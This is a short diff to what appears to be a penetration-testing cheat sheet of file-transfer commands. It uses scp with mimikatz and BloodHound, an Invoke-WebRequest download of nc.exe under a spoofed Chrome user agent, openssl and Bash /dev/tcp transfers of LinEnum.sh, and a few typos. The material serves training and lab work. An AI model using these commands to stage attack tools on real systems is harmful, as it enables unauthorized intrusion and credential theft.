@@ -11,7 +11,7 @@
 | `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
-|
+| # linux
 | **Command** | **Description** |
 | --------------|-------------------|
 | `OPPESLL Transfer File `
@@ -19,7 +19,7 @@
 | `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh` | Stand up server
 | `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` | Download file
 | 
-| `Bash (/dev/tcp)`
+| # Bash (/dev/tcp)
 | `exec 3<>/dev/tcp/10.10.10.32/80` | Connect to Target's Webserver
 | `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` | HTTP GET Request
 | `cat <&3` | Print the Response
